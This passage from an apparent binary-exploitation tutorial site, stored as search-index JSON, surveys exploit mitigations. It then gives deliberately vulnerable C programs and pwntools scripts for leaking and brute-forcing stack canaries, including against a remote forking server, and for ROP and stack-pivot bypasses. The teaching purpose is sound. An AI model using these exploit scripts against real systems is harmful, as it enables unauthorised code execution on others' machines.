detect_pie_binary():\n    \"\"\"Detect if binary is compiled with PIE\"\"\"\n\n    import subprocess\n\n    def check_pie(binary_path):\n        try:\n            # Use readelf to check for PIE\n            result = subprocess.run(['readelf', '-h', binary_path],\n                                  capture_output=True, text=True)\n\n            if 'DYN' in result.stdout:\n                print(f\"{binary_path}: PIE enabled (Dynamic)\")\n            elif 'EXEC' in result.stdout:\n                print(f\"{binary_path}: PIE disabled (Executable)\")\n            else:\n                print(f\"{binary_path}: Unknown type\")\n\n        except:\n            print(f\"Could not analyze {binary_path}\")\n\n    # Example usage\n    print(\"PIE detection using readelf:\")\n    print(\"Type: EXEC = No PIE, DYN = PIE enabled\")\n\nanalyze_pie_protection()\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#control-flow-integrity-cfi","title":"Control Flow Integrity (CFI)","text":""},{"location":"binary-exploitation/protection/01-mitigations/#cfi-concepts","title":"CFI Concepts","text":"<p>CFI prevents attackers from hijacking program control flow.</p> <pre><code>// CFI Example\nvoid legitimate_function() {\n    printf(\"Legitimate function\\n\");\n}\n\nvoid attacker_function() {\n    printf(\"Attacker function\\n\");\n    system(\"/bin/sh\");\n}\n\nint main() {\n    void (*func_ptr)() = legitimate_function;\n\n    // Without CFI: attacker can change func_ptr to attacker_function\n    // With CFI: call will be validated against allowed targets\n\n    func_ptr();  // CFI checks if this is a valid call target\n\n    return 0;\n}\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#hardware-cfi-features","title":"Hardware CFI Features","text":"<pre><code>#!/usr/bin/env python3\n\ndef check_cfi_support():\n    \"\"\"Check for CFI hardware support\"\"\"\n\n    cfi_features = {\n        'Intel CET': {\n            'description': 'Control-flow Enforcement Technology',\n            'features': ['IBT (Indirect Branch Tracking)', 'Shadow Stack'],\n            'status': 'Available on newer Intel CPUs'\n        },\n        'ARM Pointer Authentication': {\n            'description': 'Cryptographic signatures for return addresses',\n            'features': ['PAC (Pointer Authentication)', 'BTI (Branch Target Identification)'],\n            'status': 'Available on ARMv8.3+ CPUs'\n        },\n        'Compiler CFI': {\n            'description': 'Software-based control flow integrity',\n            'features': ['Clang CFI', 'GCC -fcf-protection'],\n            'status': 'Available in modern compilers'\n        }\n    }\n\n    print(\"Control Flow Integrity Support:\")\n    for name, info in cfi_features.items():\n        print(f\"\\n{name}:\")\n        print(f\"  Description: {info['description']}\")\n        print(f\"  Features: {', '.join(info['features'])}\")\n        print(f\"  Status: {info['status']}\")\n\ncheck_cfi_support()\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#relro-relocation-read-only","title":"RELRO (Relocation Read-Only)","text":""},{"location":"binary-exploitation/protection/01-mitigations/#relro-protection","title":"RELRO Protection","text":"<p>RELRO makes certain sections read-only after initialization.</p> <pre><code>RELRO Protection Levels:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Protection Level    \u2502 .got Protection     \u2502 .got.plt Protection \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 No RELRO           \u2502 Read/Write          \u2502 Read/Write          \u2502\n\u2502 Partial RELRO      \u2502 Read-Only           \u2502 Read/Write          \u2502\n\u2502 Full RELRO         \u2502 Read-Only           \u2502 Read-Only           \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#testing-relro","title":"Testing RELRO","text":"<pre><code>#!/usr/bin/env python3\nimport subprocess\n\ndef check_relro_protection(binary_path):\n    \"\"\"Check RELRO protection level\"\"\"\n\n    try:\n        # Use checksec or readelf\n        result = subprocess.run(['readelf', '-l', binary_path],\n                              capture_output=True, text=True)\n\n        if 'GNU_RELRO' in result.stdout:\n            # Check for BIND_NOW\n            bind_result = subprocess.run(['readelf', '-d', binary_path],\n                                       capture_output=True, text=True)\n\n            if 'BIND_NOW' in bind_result.stdout:\n                print(f\"{binary_path}: Full RELRO\")\n            else:\n                print(f\"{binary_path}: Partial RELRO\")\n        else:\n            print(f\"{binary_path}: No RELRO\")\n\n    except:\n        print(f\"Could not analyze {binary_path}\")\n\ndef relro_compilation_options():\n    \"\"\"Show RELRO compilation options\"\"\"\n\n    options = {\n        'No RELRO': 'gcc -Wl,-z,norelro',\n        'Partial RELRO': 'gcc (default)',\n        'Full RELRO': 'gcc -Wl,-z,relro,-z,now'\n    }\n\n    print(\"RELRO Compilation Options:\")\n    for level, command in options.items():\n        print(f\"{level}: {command}\")\n\nrelro_compilation_options()\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#fortify-source","title":"Fortify Source","text":""},{"location":"binary-exploitation/protection/01-mitigations/#fortify_source-protection","title":"FORTIFY_SOURCE Protection","text":"<p>FORTIFY_SOURCE adds bounds checking to dangerous functions.</p> <pre><code>// Example of FORTIFY_SOURCE protection\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid unsafe_operations() {\n    char buffer[10];\n    char large_input[100];\n\n    // FORTIFY_SOURCE can detect these:\n    strcpy(buffer, large_input);        // Buffer too small\n    memcpy(buffer, large_input, 50);    // Size exceeds buffer\n    sprintf(buffer, \"%s\", large_input); // Format string overflow\n}\n\n// How FORTIFY_SOURCE works (simplified)\n#ifdef __FORTIFY_SOURCE\n#define strcpy(dest, src) \\\n    (__builtin_object_size(dest, 0) != -1 ? \\\n     __strcpy_chk(dest, src, __builtin_object_size(dest, 0)) : \\\n     strcpy(dest, src))\n#endif\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#testing-fortify_source","title":"Testing FORTIFY_SOURCE","text":"<pre><code>#!/usr/bin/env python3\n\ndef test_fortify_source():\n    \"\"\"Test FORTIFY_SOURCE protection\"\"\"\n\n    test_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n    char small_buffer[10];\n    char large_data[100];\n\n    memset(large_data, 'A', sizeof(large_data));\n    large_data[99] = '\\\\0';\n\n    printf(\"Attempting dangerous copy...\\\\n\");\n\n    // This should be caught by FORTIFY_SOURCE\n    strcpy(small_buffer, large_data);\n\n    printf(\"Copy succeeded\\\\n\");\n    return 0;\n}\n'''\n\n    print(\"FORTIFY_SOURCE test:\")\n    print(\"Compile with: gcc -D_FORTIFY_SOURCE=2 -O2\")\n    print(\"Should abort with: *** buffer overflow detected ***\")\n\ntest_fortify_source()\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#comprehensive-protection-analysis","title":"Comprehensive Protection Analysis","text":""},{"location":"binary-exploitation/protection/01-mitigations/#binary-protection-analysis-tool","title":"Binary Protection Analysis Tool","text":"<pre><code>#!/usr/bin/env python3\nimport subprocess\nimport re\n\nclass BinaryProtectionAnalyzer:\n    def __init__(self, binary_path):\n        self.binary_path = binary_path\n        self.protections = {}\n\n    def check_all_protections(self):\n        \"\"\"Check all common protections\"\"\"\n\n        self.check_nx_dep()\n        self.check_stack_canary()\n        self.check_pie()\n        self.check_relro()\n        self.check_fortify()\n\n        return self.protections\n\n    def check_nx_dep(self):\n        \"\"\"Check NX/DEP protection\"\"\"\n        try:\n            result = subprocess.run(['readelf', '-l', self.binary_path],\n                                  capture_output=True, text=True)\n\n            if 'GNU_STACK' in result.stdout:\n                # Check if stack is executable\n                if re.search(r'GNU_STACK.*RWE', result.stdout):\n                    self.protections['NX'] = 'Disabled (Executable Stack)'\n                else:\n                    self.protections['NX'] = 'Enabled'\n            else:\n                self.protections['NX'] = 'Unknown'\n        except:\n            self.protections['NX'] = 'Check Failed'\n\n    def check_stack_canary(self):\n        \"\"\"Check stack canary protection\"\"\"\n        try:\n            result = subprocess.run(['objdump', '-d', self.binary_path],\n                                  capture_output=True, text=True)\n\n            if '__stack_chk_fail' in result.stdout:\n                self.protections['Stack Canary'] = 'Enabled'\n            else:\n                self.protections['Stack Canary'] = 'Disabled'\n        except:\n            self.protections['Stack Canary'] = 'Check Failed'\n\n    def check_pie(self):\n        \"\"\"Check PIE protection\"\"\"\n        try:\n            result = subprocess.run(['readelf', '-h', self.binary_path],\n                                  capture_output=True, text=True)\n\n            if 'Type:' in result.stdout:\n                if 'DYN' in result.stdout:\n                    self.protections['PIE'] = 'Enabled'\n                elif 'EXEC' in result.stdout:\n                    self.protections['PIE'] = 'Disabled'\n                else:\n                    self.protections['PIE'] = 'Unknown'\n        except:\n            self.protections['PIE'] = 'Check Failed'\n\n    def check_relro(self):\n        \"\"\"Check RELRO protection\"\"\"\n        try:\n            result = subprocess.run(['readelf', '-l', self.binary_path],\n                                  capture_output=True, text=True)\n\n            if 'GNU_RELRO' in result.stdout:\n                # Check for BIND_NOW\n                bind_result = subprocess.run(['readelf', '-d', self.binary_path],\n                                           capture_output=True, text=True)\n\n                if 'BIND_NOW' in bind_result.stdout:\n                    self.protections['RELRO'] = 'Full'\n                else:\n                    self.protections['RELRO'] = 'Partial'\n            else:\n                self.protections['RELRO'] = 'Disabled'\n        except:\n            self.protections['RELRO'] = 'Check Failed'\n\n    def check_fortify(self):\n        \"\"\"Check FORTIFY_SOURCE\"\"\"\n        try:\n            result = subprocess.run(['objdump', '-t', self.binary_path],\n                                  capture_output=True, text=True)\n\n            fortify_functions = ['__memcpy_chk', '__strcpy_chk', '__sprintf_chk']\n\n            if any(func in result.stdout for func in fortify_functions):\n                self.protections['FORTIFY_SOURCE'] = 'Enabled'\n            else:\n                self.protections['FORTIFY_SOURCE'] = 'Disabled'\n        except:\n            self.protections['FORTIFY_SOURCE'] = 'Check Failed'\n\n    def print_report(self):\n        \"\"\"Print protection analysis report\"\"\"\n\n        print(f\"\\nBinary Protection Analysis: {self.binary_path}\")\n        print(\"=\" * 50)\n\n        for protection, status in self.protections.items():\n            if 'Enabled' in status or 'Full' in status:\n                indicator = \"\u2713\"\n            elif 'Disabled' in status:\n                indicator = \"\u2717\"\n            else:\n                indicator = \"?\"\n\n            print(f\"{indicator} {protection:15} : {status}\")\n\n# Usage example\ndef analyze_binary_protections(binary_path):\n    analyzer = BinaryProtectionAnalyzer(binary_path)\n    analyzer.check_all_protections()\n    analyzer.print_report()\n\n    return analyzer.protections\n\n# Example usage\n# protections = analyze_binary_protections('./vulnerable_program')\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#system-level-protections","title":"System-Level Protections","text":""},{"location":"binary-exploitation/protection/01-mitigations/#kernel-protections","title":"Kernel Protections","text":"<pre><code>#!/usr/bin/env python3\n\ndef check_kernel_protections():\n    \"\"\"Check kernel-level protections\"\"\"\n\n    kernel_protections = {\n        'KASLR': '/proc/sys/kernel/randomize_va_space',\n        'KPTI': '/sys/devices/system/cpu/vulnerabilities/meltdown',\n        'SMEP': 'dmesg | grep SMEP',\n        'SMAP': 'dmesg | grep SMAP',\n    }\n\n    print(\"Kernel Protection Status:\")\n\n    try:\n        # Check ASLR\n        with open('/proc/sys/kernel/randomize_va_space', 'r') as f:\n            aslr_level = f.read().strip()\n            levels = {\n                '0': 'Disabled',\n                '1': 'Conservative',\n                '2': 'Full'\n            }\n            print(f\"ASLR: {levels.get(aslr_level, 'Unknown')} ({aslr_level})\")\n    except:\n        print(\"ASLR: Check Failed\")\n\n    # Check CPU vulnerabilities\n    vuln_files = [\n        'meltdown', 'spectre_v1', 'spectre_v2', \n        'spec_store_bypass', 'l1tf', 'mds'\n    ]\n\n    print(\"\\nCPU Vulnerability Mitigations:\")\n    for vuln in vuln_files:\n        try:\n            with open(f'/sys/devices/system/cpu/vulnerabilities/{vuln}', 'r') as f:\n                status = f.read().strip()\n                print(f\"{vuln}: {status}\")\n        except:\n            continue\n\ndef check_address_space_layout():\n    \"\"\"Check current process address space layout\"\"\"\n\n    try:\n        with open('/proc/self/maps', 'r') as f:\n            maps = f.read()\n\n        print(\"\\nCurrent Process Memory Layout:\")\n        print(\"Address Range          Perms  Mapping\")\n        print(\"-\" * 50)\n\n        for line in maps.split('\\n')[:15]:  # First 15 mappings\n            if line:\n                parts = line.split()\n                if len(parts) &gt;= 2:\n                    addr_range = parts[0]\n                    perms = parts[1]\n                    mapping = parts[-1] if len(parts) &gt; 5 else \"[anonymous]\"\n                    print(f\"{addr_range:18} {perms:5} {mapping}\")\n\n    except:\n        print(\"Could not read memory maps\")\n\ncheck_kernel_protections()\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#key-takeaways","title":"Key Takeaways","text":"<p>Security Mitigation Fundamentals</p> <ul> <li>Defense in depth - Multiple layers of protection work together</li> <li>Each mitigation addresses specific attack vectors - No single protection is sufficient</li> <li>Hardware and software cooperation - Modern protections leverage both</li> <li>Performance trade-offs - Security comes with computational cost</li> <li>Bypass techniques exist - Attackers continuously develop new methods</li> </ul> <p>Common Misconceptions</p> <ul> <li>One protection is enough to prevent all attacks</li> <li>Mitigations make exploitation impossible</li> <li>All binaries have the same protection levels</li> <li>Protections are either fully on or off</li> <li>Modern systems are completely secure</li> </ul> <p>Practical Applications</p> <ul> <li>Always enable available protections during compilation</li> <li>Understand what each protection defends against</li> <li>Test protection effectiveness in your environment</li> <li>Keep systems updated for latest mitigation features</li> <li>Combine mitigations with secure coding practices</li> </ul> <p>Next: Stack Canary Bypass</p>"},{"location":"binary-exploitation/protection/02-canary-bypass/","title":"Stack Canary Bypass","text":"<p>Stack canaries are a crucial defense against buffer overflow attacks, but they can be bypassed using various techniques. Understanding these bypass methods is essential for both attackers and defenders to properly assess security risks.</p>"},{"location":"binary-exploitation/protection/02-canary-bypass/#understanding-stack-canaries","title":"Understanding Stack Canaries","text":""},{"location":"binary-exploitation/protection/02-canary-bypass/#how-stack-canaries-work","title":"How Stack Canaries Work","text":"<pre><code>// Simplified canary implementation\nvoid function_with_buffer() {\n    // 1. Compiler inserts canary load\n    unsigned long canary = __stack_chk_guard;\n\n    char buffer[256];  // Local variables\n\n    // User code here...\n    gets(buffer);  // Vulnerable operation\n\n    // 2. Compiler inserts canary check before return\n    if (canary != __stack_chk_guard) {\n        __stack_chk_fail();  // Abort program\n    }\n\n    return;  // Safe to return\n}\n</code></pre>"},{"location":"binary-exploitation/protection/02-canary-bypass/#stack-layout-with-canaries","title":"Stack Layout with Canaries","text":"<pre><code>Stack Frame with Canary:\nHigh Address\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Function Args     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Return Address    \u2502 \u2190 Target for control flow hijacking\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Saved RBP         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Stack Canary      \u2502 \u2190 Detection mechanism (8 bytes)\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Local Variables   \u2502 \u2190 Buffer overflow starts here\n\u2502   (buffer[256])     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nLow Address\n</code></pre>"},{"location":"binary-exploitation/protection/02-canary-bypass/#information-leak-techniques","title":"Information Leak Techniques","text":""},{"location":"binary-exploitation/protection/02-canary-bypass/#method-1-format-string-leak","title":"Method 1: Format String Leak","text":"<pre><code>// vuln_format_canary.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid vulnerable_function() {\n    char format_buffer[100];\n    char overflow_buffer[100];\n\n    printf(\"Enter format string: \");\n    fgets(format_buffer, sizeof(format_buffer), stdin);\n\n    // VULNERABLE: Format string leak\n    printf(format_buffer);\n\n    printf(\"Enter data: \");\n    gets(overflow_buffer);  // VULNERABLE: Buffer overflow\n\n    printf(\"Function completed\\n\");\n}\n\nint main() {\n    vulnerable_function();\n    return 0;\n}\n</code></pre> <p>Exploitation: <pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef exploit_format_string_canary_leak():\n    \"\"\"Leak canary using format string vulnerability\"\"\"\n\n    context.arch = 'amd64'\n    p = process('./vuln_format_canary')\n\n    # Step 1: Leak the canary using format string\n    # Try different offsets to find the canary\n    for offset in range(10, 30):\n        p = process('./vuln_format_canary')\n\n        # Send format string to leak stack value\n        payload = f'%{offset}$p\\n'.encode()\n        p.send(payload)\n\n        # Receive output\n        try:\n            output = p.recvline(timeout=1)\n\n            # Look for canary pattern (typically ends with 0x00)\n            if b'0x' in output:\n                leaked_value = output.strip()\n                addr = int(leaked_value, 16)\n\n                # Canary typically has null byte at end\n                if (addr &amp; 0xff) == 0 and addr &gt; 0x1000:\n                    print(f\"Potential canary at offset {offset}: {hex(addr)}\")\n\n                    # Test this canary value\n                    p.sendline(b'test')\n                    p.close()\n\n                    return offset, addr\n        except:\n            pass\n\n        p.close()\n\n    print(\"Could not find canary\")\n    return None, None\n\ndef exploit_with_leaked_canary():\n    \"\"\"Complete exploit using leaked canary\"\"\"\n\n    # First, leak the canary\n    offset, canary = exploit_format_string_canary_leak()\n\n    if not canary:\n        print(\"Failed to leak canary\")\n        return\n\n    print(f\"Leaked canary: {hex(canary)}\")\n\n    # Step 2: Use leaked canary in buffer overflow\n    p = process('./vuln_format_canary')\n\n    # Skip format string part\n    p.sendline(b'hello')\n\n    # Build overflow payload preserving canary\n    payload = b'A' * 100        # Fill buffer\n    payload += p64(canary)      # Preserve canary\n    payload += b'B' * 8         # Saved RBP\n    payload += p64(0x401234)    # Return address (example)\n\n    p.sendline(payload)\n    p.interactive()\n\nexploit_format_string_canary_leak()\n</code></pre></p>"},{"location":"binary-exploitation/protection/02-canary-bypass/#method-2-memory-disclosure-via-overflow","title":"Method 2: Memory Disclosure via Overflow","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef partial_overwrite_canary_leak():\n    \"\"\"Leak canary by partial overwrites\"\"\"\n\n    # This technique works when we can:\n    # 1. Partially overwrite canary\n    # 2. Program doesn't immediately exit\n    # 3. We can observe behavior differences\n\n    for canary_byte in range(256):\n        try:\n            p = process('./vuln_program')\n\n            # Overflow to partially overwrite canary's first byte\n            payload = b'A' * 100  # Fill buffer to canary\n            payload += bytes([canary_byte])  # Guess canary's first byte\n\n            p.sendline(payload)\n\n            # Check if program continues normally\n            try:\n                output = p.recv(timeout=1)\n                if b'completed' in output:\n                    print(f\"Possible canary byte: 0x{canary_byte:02x}\")\n            except:\n                pass  # Program crashed, wrong guess\n\n            p.close()\n\n        except:\n            continue\n\ndef bruteforce_canary_byte_by_byte():\n    \"\"\"Bruteforce canary one byte at a time\"\"\"\n\n    context.log_level = 'error'  # Reduce noise\n\n    canary = b''\n    buffer_size = 100  # Distance to canary\n\n    # Bruteforce each byte of the canary\n    for byte_pos in range(8):  # 64-bit canary\n        print(f\"Bruteforcing canary byte {byte_pos}\")\n\n        for guess in range(256):\n            try:\n                p = process('./vuln_program')\n\n                # Payload: buffer + partial canary\n                payload = b'A' * buffer_size\n                payload += canary + bytes([guess])\n\n                p.sendline(payload)\n\n                # Check if program didn't crash\n                try:\n                    output = p.recvall(timeout=1)\n                    if len(output) &gt; 0:  # Program responded\n                        canary += bytes([guess])\n                        print(f\"Found byte {byte_pos}: 0x{guess:02x}\")\n                        p.close()\n                        break\n                except:\n                    pass  # Program crashed\n\n                p.close()\n\n            except:\n                continue\n        else:\n            print(f\"Could not find byte {byte_pos}\")\n            break\n\n    print(f\"Recovered canary: {canary.hex()}\")\n    return canary\n\n# Example usage\n# bruteforce_canary_byte_by_byte()\n</code></pre>"},{"location":"binary-exploitation/protection/02-canary-bypass/#bypass-techniques","title":"Bypass Techniques","text":""},{"location":"binary-exploitation/protection/02-canary-bypass/#method-3-overwrite-canary-storage","title":"Method 3: Overwrite Canary Storage","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef overwrite_canary_storage():\n    \"\"\"Overwrite the canary storage location\"\"\"\n\n    # The canary is typically stored at %fs:0x28 on x86_64\n    # If we can write to this location, we can change the \"expected\" value\n\n    canary_corruption_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n// Global canary storage (simplified example)\nunsigned long global_canary = 0xdeadbeefcafebabe;\n\nvoid vulnerable_function() {\n    char buffer[100];\n    unsigned long local_canary = global_canary;\n\n    printf(\"Enter data: \");\n    gets(buffer);  // Can overflow\n\n    // Check against global canary (which we might have corrupted)\n    if (local_canary != global_canary) {\n        printf(\"Stack smashing detected!\\\\n\");\n        abort();\n    }\n\n    printf(\"Function completed\\\\n\");\n}\n\nint main() {\n    printf(\"Global canary at: %p\\\\n\", &amp;global_canary);\n    vulnerable_function();\n    return 0;\n}\n'''\n\n    print(\"Canary storage corruption concept:\")\n    print(\"1. Find address of canary storage\")\n    print(\"2. Use vulnerability to write to that address\")\n    print(\"3. Change expected canary value\")\n    print(\"4. Overflow buffer with matching canary\")\n\ndef thread_local_storage_attack():\n    \"\"\"Attack thread-local storage where canary is kept\"\"\"\n\n    tls_attack_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;pthread.h&gt;\n\nvoid* vulnerable_thread(void* arg) {\n    char buffer[100];\n\n    printf(\"Thread canary location: %%fs:0x28\\\\n\");\n\n    // If we can write to %fs:0x28, we control the canary\n    // This requires specific vulnerabilities like:\n    // - Arbitrary write primitive\n    // - Thread-local storage corruption\n\n    gets(buffer);\n\n    printf(\"Thread completed\\\\n\");\n    return NULL;\n}\n\nint main() {\n    pthread_t thread;\n    pthread_create(&amp;thread, NULL, vulnerable_thread, NULL);\n    pthread_join(thread, NULL);\n    return 0;\n}\n'''\n\n    print(\"Thread-local storage attack:\")\n    print(\"1. Canary stored in thread-local storage (%fs:0x28)\")\n    print(\"2. Corrupt TLS to change canary value\")\n    print(\"3. Overflow with matching corrupted canary\")\n\noverwrite_canary_storage()\n</code></pre>"},{"location":"binary-exploitation/protection/02-canary-bypass/#method-4-fork-based-bruteforce","title":"Method 4: Fork-Based Bruteforce","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef fork_based_bruteforce():\n    \"\"\"Bruteforce canary using fork() behavior\"\"\"\n\n    # When a process forks, child inherits parent's canary\n    # We can bruteforce byte-by-byte without canary changing\n\n    fork_exploit_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n\nvoid vulnerable_function() {\n    char buffer[100];\n\n    printf(\"PID: %d\\\\n\", getpid());\n    printf(\"Enter data: \");\n\n    gets(buffer);\n\n    printf(\"Data received: %s\\\\n\", buffer);\n    printf(\"Function completed\\\\n\");\n}\n\nint main() {\n    while (1) {\n        pid_t pid = fork();\n\n        if (pid == 0) {\n            // Child process - has same canary as parent\n            vulnerable_function();\n            return 0;\n        } else {\n            // Parent process - wait for child\n            int status;\n            wait(&amp;status);\n\n            if (WIFEXITED(status)) {\n                printf(\"Child exited normally\\\\n\");\n            } else {\n                printf(\"Child crashed\\\\n\");\n            }\n        }\n    }\n\n    return 0;\n}\n'''\n\n    def exploit_forking_server():\n        \"\"\"Exploit forking server with canary bruteforce\"\"\"\n\n        canary = b''\n        buffer_offset = 104  # Distance to canary\n\n        for byte_position in range(8):  # 8-byte canary\n            print(f\"Bruteforcing canary byte {byte_position}\")\n\n            for candidate in range(256):\n                p = remote('target', 1234)  # Connect to forking server\n\n                # Build payload\n                payload = b'A' * buffer_offset\n                payload += canary + bytes([candidate])\n\n                p.sendline(payload)\n\n                # Check response\n                try:\n                    response = p.recvall(timeout=2)\n                    if b'completed' in response:\n                        # Found correct byte\n                        canary += bytes([candidate])\n                        print(f\"Found byte {byte_position}: 0x{candidate:02x}\")\n                        p.close()\n                        break\n                except:\n                    pass  # Connection died, wrong guess\n\n                p.close()\n            else:\n                print(f\"Failed to find byte {byte_position}\")\n                return None\n\n        print(f\"Complete canary: {canary.hex()}\")\n        return canary\n\n    print(\"Fork-based bruteforce:\")\n    print(\"1. Server forks for each connection\")\n    print(\"2. Child processes inherit parent's canary\")\n    print(\"3. Bruteforce one byte at a time\")\n    print(\"4. Correct bytes don't crash the child\")\n\nfork_based_bruteforce()\n</code></pre>"},{"location":"binary-exploitation/protection/02-canary-bypass/#method-5-stack-pivot-and-rop","title":"Method 5: Stack Pivot and ROP","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef stack_pivot_bypass():\n    \"\"\"Bypass canary using stack pivot\"\"\"\n\n    # Instead of overwriting return address directly,\n    # pivot stack to controlled memory\n\n    context.arch = 'amd64'\n\n    def find_stack_pivot_gadget():\n        \"\"\"Find stack pivot gadgets\"\"\"\n\n        elf = ELF('./target_binary')\n\n        # Look for stack pivot gadgets\n        # Common patterns: mov rsp, reg; ret\n        # add rsp, value; ret\n        # xchg rsp, reg; ret\n\n        pivot_gadgets = [\n            asm('mov rsp, rax; ret'),\n            asm('mov rsp, rbx; ret'), \n            asm('add rsp, 0x10; ret'),\n            asm('pop rsp; ret'),\n        ]\n\n        print(\"Looking for stack pivot gadgets...\")\n        for gadget in pivot_gadgets:\n            # Search in binary\n            for addr in elf.search(gadget):\n                print(f\"Found pivot gadget at 0x{addr:x}: {disasm(gadget)}\")\n\n    def exploit_with_stack_pivot():\n        \"\"\"Exploit using stack pivot to avoid canary\"\"\"\n\n        # Allocate controlled memory (heap, BSS, etc.)\n        controlled_memory = 0x404800  # Example BSS address\n\n        # Build ROP chain in controlled memory\n        rop_chain = [\n            0x401234,  # pop rdi; ret\n            controlled_memory + 0x100,  # \"/bin/sh\" string\n            0x401567,  # system address\n        ]\n\n        # First stage: write ROP chain to controlled memory\n        # This might use format string, heap overflow, etc.\n\n        # Second stage: stack pivot\n        payload = b'A' * 100  # Fill buffer (don't touch canary)\n        # Use different vulnerability to control RSP\n\n        print(\"Stack pivot bypass strategy:\")\n        print(\"1. Write ROP chain to controlled memory\")\n        print(\"2. Use stack pivot to change RSP\")\n        print(\"3. Execute ROP chain from new stack location\")\n        print(\"4. Never overwrite canary or return address\")\n\n    find_stack_pivot_gadget()\n\ndef ret2libc_bypass():\n    \"\"\"Bypass canary using ret2libc without stack smashing\"\"\"\n\n    context.arch = 'amd64'\n\n    def one_gadget_approach():\n        \"\"\"Use one_gadget to avoid complex ROP\"\"\"\n\n        # Find one_gadget in libc\n        # one_gadget gives direct shell without setup\n\n        libc_leak = 0x7ffff7a00000  # Example leaked libc base\n        one_gadget_offset = 0x45216  # Example one_gadget offset\n\n        one_gadget_addr = libc_leak + one_gadget_offset\n\n        print(f\"one_gadget address: 0x{one_gadget_addr:x}\")\n\n        # Strategy: use different vulnerability to call one_gadget\n        # - Function pointer overwrite\n        # - GOT overwrite\n        # - Virtual table corruption\n\n        print(\"one_gadget bypass strategy:\")\n        print(\"1. Leak libc address\")\n        print(\"2. Calculate one_gadget address\")\n        print(\"3. Overwrite function pointer with one_gadget\")\n        print(\"4. Trigger function call\")\n\n    def function_pointer_overwrite():\n        \"\"\"Overwrite function pointer instead of return address\"\"\"\n\n        # Many programs have function pointers that can be overwritten\n        # - Virtual function tables\n        # - Callback functions\n        # - Function pointer arrays\n\n        function_ptr_c = '''\nvoid (*callback)(void) = NULL;\n\nvoid set_callback(void (*func)(void)) {\n    callback = func;\n}\n\nvoid trigger_callback() {\n    if (callback) {\n        callback();  // Call overwritten function\n    }\n}\n\nvoid vulnerable_function() {\n    char buffer[100];\n    gets(buffer);  // Overflow but don't touch canary\n\n    // If buffer is adjacent to callback pointer...\n    trigger_callback();\n}\n'''\n\n        print(\"Function pointer overwrite:\")\n        print(\"1. Find function pointer near buffer\")\n        print(\"2. Overflow to overwrite pointer\")\n        print(\"3. Don't touch stack canary\")\n        print(\"4. Trigger function pointer call\")\n\n    